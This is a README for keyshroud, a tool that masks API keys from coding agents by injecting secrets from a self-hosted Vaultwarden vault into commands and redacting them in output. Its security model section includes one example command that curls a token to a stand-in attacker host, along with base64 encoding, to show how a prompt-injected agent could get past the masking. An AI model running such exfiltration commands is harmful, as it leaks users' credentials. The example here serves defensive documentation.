<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**Your agents use the keys. They never see them.**

**Keep API keys out of Claude Code, Codex, Cursor, Cline, OpenCode, Gemini CLI, pi and omp** —
secrets stay in your own self-hosted [Vaultwarden](https://github.com/dani-garcia/vaultwarden)
(or Bitwarden), and every value is masked before the model reads it.

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)

[🚀 Quickstart](#quickstart) · [🔌 Supported agents](#supported-agents) · [⚙️ How it works](#how-it-works) · [❓ FAQ](#faq) · [🛡️ Security model](#security-model) · [🌐 Website](https://keyshroud.dev)

[🇻🇳 Tiếng Việt](i18n/README.vi.md)

</div>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

The command got the real token. The transcript — and the model reading it — got
`<redacted:GH_TOKEN>`. (Masking is automatic when an agent runs the command;
`--mask` forces it in a human terminal.)

## Why keyshroud?

Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs,
webhooks, databases. The usual options are bad:

- ❌ **Paste the key into the chat** — now it is in the transcript, the provider's logs, and every future context window
- ❌ **Put it in `.env`** — the agent `cat`s it while debugging, or commits it
- ❌ **Pay for a secrets manager** — `op run` needs a 1Password subscription, and most "agent vaults" are hosted SaaS
- ❌ **Use a vault MCP server** — most of them return the plaintext value straight to the model

**keyshroud fixes this:**

- ✅ **Names, not values** — agents see `GH_TOKEN` and `bw://GitHub CLI token`, never the token
- ✅ **Masked output** — any value that reaches stdout/stderr becomes `<redacted:GH_TOKEN>`
- ✅ **Your vault** — Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden; no account with us
- ✅ **Free** — MIT-licensed, no telemetry

## Features

| | |
|---|---|
| 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout/stderr with `<redacted:NAME>` — streaming-safe across chunk boundaries. |
| 🪝 **Agent hooks** | The pi/omp `tool_result` hook redacts every tool result, failed ones included. Claude Code's `PostToolUse` hook redacts every *successful* tool result (Bash, Read, Grep, MCP…) — see [limits](#security-model). |
| 🔌 **MCP server** | `keyshroud mcp` gives any MCP client `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool ever returns a value. |
| 🔗 **Commit-safe references** | `bw://item`, `bw://item/username`, `bw://item/fields/name`, `bw://item/totp` in `.env.refs` files and templates. |
| ⌨️ **Paste-to-create** | New secrets go through a masked prompt in the user's terminal or a masked popup in pi — never through the chat. |
| 📄 **`inject`** | Render `{{ bw://… }}` templates into `0600` config files for tools that can't read env vars (`.npmrc`, kubeconfig). |
| 🔎 **`scan`** | Find vault values that leaked into your working tree (pre-commit friendly). |
| ⚡ **Fast** | One batched `bw list items` per session instead of one `bw get` (~3 s) per secret. |
| 🏠 **Self-hosted, free** | Vaultwarden on a $5 VPS or a Raspberry Pi. No SaaS account, no telemetry. |
| 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. |

## Supported agents

| Agent | Install | What you get |
|---|---|---|
| **Claude Code** | [plugin](#claude-code) | SessionStart + PostToolUse redaction hooks, MCP tools, skill |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | env hydration, `tool_result` redaction (failed calls too), `/secret` |
| **Codex** | [`codex mcp add keyshroud -- keyshroud mcp`](#any-mcp-client) | MCP tools with masked output |
| **Cursor, Claude Desktop, Cline, Gemini CLI** | [`mcpServers` JSON](#any-mcp-client) | MCP tools with masked output |
| **OpenCode** | [`mcp` config](#any-mcp-client) | MCP tools with masked output |
| **Any shell or CI** | `keyshroud run -- <cmd>` | env injection + masked output |

## Use cases

**"Claude Code keeps reading my `.env`."** Move the values into the vault, commit a
`.env.refs` file with `GH_TOKEN=bw://GitHub CLI token`, and start the agent with
`keyshroud run -- claude`. The plugin's hooks mask anything that still slips into a tool result.

**"I already self-host Vaultwarden."** Point `bw` at it, run `keyshroud doctor`, and you
are done — keyshroud adds no server of its own.

**"I like `op run` but don't want 1Password."** `keyshroud run` is the same idea —
references in, masked output out — on a vault you host.

**"My agent needs to add a new key."** It calls `secrets_request` (MCP) or `/secret` (pi);
you type the value into a masked prompt in your own terminal. It never enters the chat.

## Quickstart

**Requirements:** Node.js ≥ 22.18, the Bitwarden CLI (`npm i -g @bitwarden/cli`),
and a Vaultwarden or Bitwarden account. No server yet?
[examples/vaultwarden](examples/vaultwarden) runs Vaultwarden behind Caddy
(automatic HTTPS) with one `docker compose up -d`.

```bash
npm install -g keyshroud

# 1. Point bw at your server and log in once
bw config server https://vault.example.com
bw login

# 2. Let keyshroud unlock without prompting (stored in the OS keychain)
security add-generic-password -a "$USER" -s vaultwarden-master-password -w      # macOS: prompts for the value
# Linux: secret-tool store --label=vaultwarden service vaultwarden-master-password account "$USER"

# 3. Check everything
keyshroud doctor

# 4. Store a secret — typed into a masked prompt, never echoed
keyshroud add --env GH_TOKEN --item "GitHub CLI token" --notes "gh for agents"

# 5. Use it
keyshroud run -- gh auth status
keyshroud run -- claude          # start an agent with every wired secret available
```

Optional: put `vaultwarden-api-client-id` / `vaultwarden-api-client-secret` (from
*Settings → Security → Keys → API key*) in the keychain too, and keyshroud will
also re-login automatically when the `bw` session expires.

## How it works

```
                     ┌──────────────────── your machine ────────────────────┐
 Vaultwarden  ◄─bw─► │ keyshroud ── resolves bw:// refs (1 batched call) ──► child process env
 (self-hosted)       │     │                                                │      │ stdout/stderr
                     │     └── redactor ◄────────────────────────────────────┘◄─────┘
                     │              │ <redacted:NAME>                                │
                     └──────────────┼────────────────────────────────────────────────┘
                                    ▼
                       agent transcript / LLM provider
```

1. **Wiring.** A secret is wired by *name*: `GH_TOKEN → bw://GitHub CLI token`.
   Wiring lives in `~/.pi/agent/auth.json` / `~/.omp/agent/auth.json`
   (shared with pi/omp) and in project `.env.refs` files. Both are safe to read.
2. **Unlock.** `bw` is unlocked from the OS keychain; the session token is cached
   in `~/.config/keyshroud/session` (`0600`).
3. **Resolve.** All references resolve from one `bw list items` snapshot held in
   memory for `KEYSHROUD_CACHE_TTL_MS` (default 1 h).
4. **Inject.** Values go into the child process environment — never into argv
   or tool results (`inject` writes `0600` files only when you ask it to).
5. **Redact.** In-process (`run`, MCP, pi/omp) output passes through a redactor
   that knows every wired value, the vault session token, and every login
   password in the vault. Out-of-process Claude Code hooks use a keyed-HMAC
   fingerprint index (`redact-index.json`, `0600`) of wired values and the
   session token only, so they never hold plaintext or fingerprint your
   personal passwords.

## Claude Code

Install the CLI, then the plugin (MCP server + redaction hooks + skill):

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

What you get:

- **SessionStart hook** — unlocks, refreshes the redaction index, and tells
  Claude which secret *names* exist.
- **PostToolUse hook** — rewrites any successful tool result that contains a
  wired value or the vault session token to `<redacted:NAME>` using Claude
  Code's `updatedToolOutput` (tested with Claude Code 2.1.296).
  **Limit:** when a command fails, Claude Code fires `PostToolUseFailure`, which
  cannot rewrite output. The skill and session context therefore tell Claude to
  run every secret-using command through `keyshroud run` (or `secrets_run`),
  which masks inside the process regardless of the exit code.
- **MCP tools** — `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`.
- **Skill** — teaches Claude to use names and references, never values.

The plugin calls `keyshroud` from `PATH`. If Claude Code is launched from a GUI
that doesn't see your npm/nvm bin directory, run `keyshroud link-cli` (links it
into `~/.local/bin`) and make sure that directory is on the GUI's `PATH`.

To give Bash commands the secrets as env vars, start Claude through keyshroud:

```bash
keyshroud run -- claude
```

Use a vault item as Claude Code's own API key (`apiKeyHelper`):

```bash
keyshroud claude-setup --item "Anthropic API key" --ttl-ms 600000
```

It backs up `settings.json` first and refuses to replace an existing helper
without `--force`.

## pi / omp

```bash
pi install npm:keyshroud
```

The extension:

- hydrates wired secrets into the agent's environment before provider auth
  resolves, so `$CUSTOM_KEY` provider references work at startup;
- redacts every tool result, successful or failed, through the `tool_result`
  hook (wired values, the vault session token, and every vault login password);
- adds `/secret` (describe → confirm name → masked paste), `/vault_add`,
  `/vault_wire`, `/vault_rotate`, `/vault_status`, and the `vault_add_secret` /
  `vault_status` tools.

`/secret` can ask a local OpenAI-compatible model to propose the item and
variable names. Only your description is sent — never the value:

```bash
export KEYSHROUD_PLANNER_URL=http://127.0.0.1:8080/v1/chat/completions
export KEYSHROUD_PLANNER_MODEL=qwen3-4b
```

Without a planner, names are derived from the description and you can edit them.

## Any MCP client

Codex, Cursor, Claude Desktop, Cline, Gemini CLI and any other client that speaks MCP over stdio:

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

Codex: `codex mcp add keyshroud -- keyshroud mcp`.
OpenCode (`opencode.json`): `"mcp": { "keyshroud": { "type": "local", "command": ["keyshroud", "mcp"] } }`.

| Tool | Does | Returns |
|---|---|---|
| `secrets_list` | Lists wired names (+ optional `env_file`) | resolved / unresolved names |
| `secrets_run` | Runs a shell command with secrets injected (`only`, `env_file`, `cwd`, `timeout_ms`) | exit code + masked stdout/stderr |
| `secrets_request` | Asks the human to store a new secret | a `keyshroud add …` command for *their* terminal |
| `vault_status` | Vault lock state, server, item count | status line |

## CLI reference

```text
keyshroud get <ENV_NAME | bw://ref>          print one value (for scripts; not for agents)
keyshroud run [--env-file F]... [--only A,B] [--no-auth] [--mask|--no-mask] -- <cmd>
keyshroud inject [-i template] [-o out] [--force]
keyshroud redact < log.txt
keyshroud scan [paths...]
keyshroud env [--shell]
keyshroud add --env NAME --item ITEM [--notes TEXT] [--target pi|omp|both] [--stdin]
keyshroud rotate --item ITEM [--stdin]
keyshroud wire --env NAME --item ITEM [--target pi|omp|both] [--force]
keyshroud unwire --env NAME [--target pi|omp|both]
keyshroud status | unlock | lock | doctor
keyshroud mcp
keyshroud hook claude <session-start|post-tool-use>
keyshroud claude-setup --item ITEM [--settings PATH] [--ttl-ms N] [--force]
keyshroud api-key --item ITEM
keyshroud link-cli [--dir DIR] [--force]
```

`run` masks output whenever stdout is not a terminal (agents, CI, pipes) and
passes the TTY through untouched for interactive use. Force either way with
`--mask` / `--no-mask`. `exec` is an alias of `run`.

**Exit codes:** `0` ok · `2` usage · `3` vault locked or unavailable · `4` secret
missing or item name ambiguous · `5` refusing to overwrite existing state.
`run` exits with the child's code.

### References

| Reference | Resolves to |
|---|---|
| `bw://GitHub CLI token` | login password |
| `bw://GitHub CLI token/username` | login username (`notes`, `uri`, `id` also work) |
| `bw://Sentry/fields/dsn` | custom field `dsn` |
| `bw://AWS root/totp` | current TOTP code |
| `bw://a%2Fb` | item named `a/b` |
| `!bw get password 'Item'` | legacy auth.json form, still supported |

Item lookup is case-insensitive by name or exact by id. Duplicate names fail
closed (exit `4`) instead of guessing.

### Configuration

| Variable | Default | |
|---|---|---|
| `KEYSHROUD_CACHE_TTL_MS` | `3600000` | in-memory vault snapshot + session check lifetime; `0` disables |
| `KEYSHROUD_CONFIG_DIR` | `$XDG_CONFIG_HOME/keyshroud` | session, redact index, audit log |
| `KEYSHROUD_KEYCHAIN_MASTER` | `vaultwarden-master-password` | keychain service names… |
| `KEYSHROUD_KEYCHAIN_CLIENT_ID` | `vaultwarden-api-client-id` | |
| `KEYSHROUD_KEYCHAIN_CLIENT_SECRET` | `vaultwarden-api-client-secret` | |
| `KEYSHROUD_AUDIT` | on | `0` disables `audit.jsonl` |
| `KEYSHROUD_PLANNER_URL` / `_MODEL` / `_API_KEY` | unset | optional naming helper for `/secret` |

## FAQ

**Do I need Vaultwarden?** No. The official Bitwarden cloud works too; keyshroud talks to
whatever server `bw` is configured for.

**Do secrets leave my machine?** Only between `bw` and your vault server. keyshroud has no
backend and sends no telemetry; values go into the environment of the command you run.

**Can the agent still use the key?** Yes. The command gets the real value; only the text
the model reads is masked.

**Is this a sandbox?** No. It stops *accidental* disclosure. A hostile or prompt-injected
agent can still exfiltrate a value it can use — see the [security model](#security-model).

**Why not just `.gitignore` my `.env`?** That stops commits, not reads. Agents read `.env`
to debug, and whatever they read goes to the model provider.

**Does it work on Windows?** Not tested yet. macOS and Linux are supported.

## Security model

keyshroud protects against **accidental disclosure**: secrets ending up in
transcripts, provider logs, screenshots, commits, or the model's context because
a command printed them.

It does **not** make a hostile or prompt-injected agent safe. An agent that can
run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
value before printing it, can exfiltrate it. If that is your threat model, use
an egress proxy that swaps placeholder credentials on the wire (for example
Infisical Agent Vault or OneCLI), restrict which secrets each session
gets with `--only`, and keep a human approving commands.

Guarantees we test for:

- secret values never appear in argv, logs, diagnostics, MCP results, hook
  output, or `audit.jsonl`;
- new secrets are read from a masked prompt or stdin, never flags;
- the session file, redact index, rendered templates and auth files are `0600`;
- auth.json writes are locked and atomic and never overwrite without `--force`;
- commands started by `run` and `secrets_run` never receive `BW_SESSION`,
  `BW_PASSWORD`, `BW_CLIENTID` or `BW_CLIENTSECRET`, so `--only` really limits
  what a command can read (inside pi/omp the agent process keeps the session for
  legacy `!bw` auth entries; its value is redacted from tool output);
- env files may contain only references and literals — a `!command` value is
  rejected, so a cloned repo's `.env.refs` cannot run code;
- an unparseable `auth.json` is never overwritten.

Known limits: an agent with shell access as your user can read
`~/.config/keyshroud/session` and use `bw` directly — run agents in a sandbox or
container if that matters. Redaction is exact-match, so a *partial* or transformed value
(`${TOKEN:0:10}`, base64, a line wrapped by a tool) is not masked; values
shorter than 6 characters are not redacted (to avoid noise), so don't wire short
PINs.

Report vulnerabilities privately — see [SECURITY.md](SECURITY.md).

## Development

```bash
npm install
npm run check        # typecheck + tests (fake bw, no real vault) + build
node src/cli.ts doctor   # run from source (Node ≥ 22.18 strips types)
```

See [CONTRIBUTING.md](CONTRIBUTING.md). The runtime-neutral core is in
`src/core.ts`; agent integrations live in `extensions/`, `src/mcp.ts` and
`src/hooks.ts`.

## Credits

Inspired by [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password)
— its popup UI and diagnostics shape are ported here (MIT). Masked output follows
1Password's `op run`. Not affiliated with Bitwarden, Inc. or the Vaultwarden
project; "Bitwarden" is a trademark of Bitwarden, Inc.

## License

[MIT](LICENSE) © 2026 dinhkarate
